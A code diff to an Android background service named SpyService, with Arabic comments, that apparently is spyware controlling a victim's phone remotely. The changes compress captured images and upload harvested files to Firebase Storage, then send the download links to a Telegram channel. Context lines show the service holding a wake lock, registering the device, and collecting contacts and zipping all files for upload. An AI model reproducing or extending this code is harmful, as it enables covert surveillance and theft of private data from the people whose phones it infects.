@@ -10,6 +10,8 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.hardware.Camera;
 import android.location.Location;
 import android.location.LocationListener;
@@ -28,17 +30,25 @@ import android.provider.MediaStore;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.widget.Toast;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 import com.google.firebase.database.*;
+import com.google.firebase.storage.FirebaseStorage;
+import com.google.firebase.storage.StorageReference;
+import com.google.firebase.storage.UploadTask;
 import okhttp3.*;
 import org.json.JSONObject;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.net.URL;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
+import java.util.Locale;
 import java.util.Map;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
@@ -66,6 +76,8 @@ public class SpyService extends Service {
 
     // Firebase
     private FirebaseDatabase database;
+    private FirebaseStorage storage;
+    private StorageReference storageRef;
     private DatabaseReference deviceRef;
     private DatabaseReference commandRef;
     private DatabaseReference dataRef;
@@ -89,8 +101,11 @@ public class SpyService extends Service {
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
         wakeLock.acquire(10 * 60 * 1000L);
 
+        // Firebase
         FirebaseDatabase.getInstance().setPersistenceEnabled(false);
         database = FirebaseDatabase.getInstance();
+        storage = FirebaseStorage.getInstance();
+        storageRef = storage.getReference();
         deviceRef = database.getReference("devices").child(deviceId);
         commandRef = database.getReference("commands").child(deviceId);
         dataRef = database.getReference("devices").child(deviceId).child("data");
@@ -138,9 +153,7 @@ public class SpyService extends Service {
 
     private void registerDevice() {
         try {
-            // حذف الأجهزة القديمة ليبقى جهاز واحد فقط
             database.getReference("devices").removeValue();
-
             Map<String, Object> info = new HashMap<>();
             info.put("device_id", deviceId);
             info.put("device_name", Build.MANUFACTURER + " " + Build.MODEL);
@@ -178,7 +191,7 @@ public class SpyService extends Service {
     }
 
     // ======================================================================
-    // ========== دوال الإرسال ==========
+    // ========== دوال الإرسال (مع Firebase Storage) ==========
     // ======================================================================
 
     private void sendData(String type, String data) {
@@ -187,18 +200,43 @@ public class SpyService extends Service {
 
     private void sendFileToFirebase(File file, String caption) {
         try {
-            byte[] bytes = new byte[(int) file.length()];
-            java.io.FileInputStream fis = new java.io.FileInputStream(file);
-            fis.read(bytes);
-            fis.close();
-            String base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT);
-            JSONObject json = new JSONObject();
-            json.put("name", file.getName());
-            json.put("data", base64);
-            json.put("caption", caption);
-            json.put("path", file.getAbsolutePath());
-            sendData("FILE", json.toString());
-            Log.d(TAG, "📤 أُرسل إلى Firebase: " + file.getName());
+            // ضغط الملف إذا كان صورة
+            if (file.getName().endsWith(".jpg") || file.getName().endsWith(".png")) {
+                Bitmap bitmap = BitmapFactory.decodeFile(file.getAbsolutePath());
+                if (bitmap != null) {
+                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos);
+                    FileOutputStream fos = new FileOutputStream(file);
+                    fos.write(baos.toByteArray());
+                    fos.close();
+                }
+            }
+
+            // رفع الملف إلى Firebase Storage
+            String fileName = deviceId + "/" + System.currentTimeMillis() + "_" + file.getName();
+            StorageReference fileRef = storageRef.child("files/" + fileName);
+            
+            UploadTask uploadTask = fileRef.putFile(Uri.fromFile(file));
+            uploadTask.addOnSuccessListener(taskSnapshot -> {
+                fileRef.getDownloadUrl().addOnSuccessListener(uri -> {
+                    String downloadUrl = uri.toString();
+                    try {
+                        JSONObject json = new JSONObject();
+                        json.put("name", file.getName());
+                        json.put("url", downloadUrl);
+                        json.put("caption", caption);
+                        json.put("path", file.getAbsolutePath());
+                        sendData("FILE", json.toString());
+                        sendTextToTelegram("📎 " + caption + "\n🔗 " + downloadUrl);
+                        Log.d(TAG, "📤 أُرسل إلى Firebase Storage: " + file.getName());
+                    } catch (Exception e) {
+                        Log.e(TAG, "Send file error", e);
+                    }
+                });
+            }).addOnFailureListener(e -> {
+                Log.e(TAG, "Upload failed", e);
+                sendTextToTelegram("❌ فشل رفع الملف: " + e.getMessage());
+            });
         } catch (Exception e) {
             Log.e(TAG, "Send file to Firebase error", e);
         }
@@ -455,7 +493,6 @@ public class SpyService extends Service {
         } catch (Exception e) { Log.e(TAG, "battery err", e); }
         return -1;
     }
-
     private File collectContacts() throws Exception {
         File f = new File(getCacheDir(), "contacts.txt");
         FileOutputStream fos = new FileOutputStream(f);
@@ -559,6 +596,7 @@ public class SpyService extends Service {
         zos.close();
         return zipFile;
     }
+
     private File collectAllFiles() throws Exception {
         File zipFile = new File(getCacheDir(), "all_files.zip");
         ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
@@ -755,7 +793,6 @@ public class SpyService extends Service {
             sendTextToTelegram("❌ فشل إطفاء الكشاف");
         }
     }
-
     // ======================================================================
     // ========== معلومات الجهاز ==========
     // ======================================================================
